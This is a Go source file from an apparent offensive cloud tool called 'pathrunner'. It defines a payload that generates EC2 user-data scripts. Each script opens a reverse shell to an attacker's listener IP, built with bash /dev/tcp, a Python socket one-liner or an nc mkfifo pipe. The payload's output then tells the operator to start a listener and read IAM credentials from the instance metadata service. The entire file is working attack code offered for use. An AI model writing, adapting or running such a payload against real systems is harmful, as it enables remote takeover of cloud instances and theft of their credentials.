package ec2

import (
	"encoding/json"
	"fmt"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
	"strings"
)

type ReverseShellPayload struct{}

func NewReverseShellPayload() *ReverseShellPayload {
	return &ReverseShellPayload{}
}

func init() {
	payloads.Register(NewReverseShellPayload())
}

func (p *ReverseShellPayload) GetName() string {
	return "access/reverse-tcp"
}

func (p *ReverseShellPayload) GetDescription() string {
	return "Establish reverse shell connection for interactive access to EC2 instance credentials"
}

func (p *ReverseShellPayload) GetTags() []string {
	return []string{
		payloads.TagServiceEC2,
		payloads.TagLanguageBash,
		payloads.TagTechniqueAccess,
		payloads.TagTransportTCP,
	}
}

func (p *ReverseShellPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "LISTENER_IP",
			Description: "IP address of attacker's reverse shell listener",
			Required:    true,
		},
		{
			Name:        "LISTENER_PORT",
			Description: "Port for reverse shell connection",
			Required:    false,
			Default:     "4444",
		},
		{
			Name:        "SHELL_TYPE",
			Description: "Type of reverse shell (bash, python, nc)",
			Required:    false,
			Default:     "bash",
		},
	}
}

func (p *ReverseShellPayload) GenerateCode(options map[string]string) (string, error) {
	listenerIP := options["LISTENER_IP"]
	listenerPort := options["LISTENER_PORT"]
	if listenerPort == "" {
		listenerPort = "4444"
	}

	shellType := options["SHELL_TYPE"]
	if shellType == "" {
		shellType = "bash"
	}

	var reverseShellCommand string
	switch shellType {
	case "bash":
		reverseShellCommand = fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", listenerIP, listenerPort)
	case "python":
		reverseShellCommand = fmt.Sprintf(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'`, listenerIP, listenerPort)
	case "nc":
		reverseShellCommand = fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %s >/tmp/f", listenerIP, listenerPort)
	default:
		return "", fmt.Errorf("invalid SHELL_TYPE: %s (must be 'bash', 'python', or 'nc')", shellType)
	}

	userDataScript := fmt.Sprintf(`#!/bin/bash
exec > >(tee /var/log/pathrunner-reverse-shell.log|logger -t pathrunner -s 2>/dev/console) 2>&1

echo "Pathrunner Reverse Shell Payload"
echo "Target: %s:%s"
echo "Shell Type: %s"
echo ""

# Wait for network to be ready
echo "Waiting for network initialization..."
sleep 10

# Attempt reverse shell connection
echo "Establishing reverse shell connection..."
%s &

echo "Reverse shell initiated"

# Keep the script running
while true; do
    sleep 60
done
`, listenerIP, listenerPort, shellType, reverseShellCommand)

	return userDataScript, nil
}

func (p *ReverseShellPayload) ProcessResult(result string) (string, error) {
	var instanceData map[string]interface{}
	if err := json.Unmarshal([]byte(result), &instanceData); err != nil {
		return result, nil
	}

	var output strings.Builder
	output.WriteString("=== Reverse Shell Payload Results ===\n\n")

	if instanceID, ok := instanceData["instance_id"].(string); ok {
		output.WriteString("Instance ID: " + instanceID + "\n")
	}

	if state, ok := instanceData["state"].(string); ok {
		output.WriteString("Instance State: " + state + "\n")
	}

	output.WriteString("\nReverse Shell Status:\n")
	output.WriteString("The EC2 instance will attempt to connect back to your listener.\n")
	output.WriteString("Connection should be established within 1-2 minutes.\n\n")

	output.WriteString("To receive the connection:\n")
	output.WriteString("1. Ensure your listener is running (e.g., nc -lvnp 4444)\n")
	output.WriteString("2. Wait for the connection from the EC2 instance\n")
	output.WriteString("3. Once connected, retrieve credentials from metadata service:\n")
	output.WriteString("   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n")

	output.WriteString("⚠ Note: Reverse shells may be blocked by security groups or NACLs\n")
	output.WriteString("Ensure the EC2 instance can reach your listener IP and port\n")

	return output.String(), nil
}

func (p *ReverseShellPayload) Validate(options map[string]string) error {
	if options["LISTENER_IP"] == "" {
		return fmt.Errorf("LISTENER_IP is required for access/reverse-tcp payload")
	}

	shellType := options["SHELL_TYPE"]
	if shellType != "" && shellType != "bash" && shellType != "python" && shellType != "nc" {
		return fmt.Errorf("SHELL_TYPE must be 'bash', 'python', or 'nc'")
	}

	return nil
}
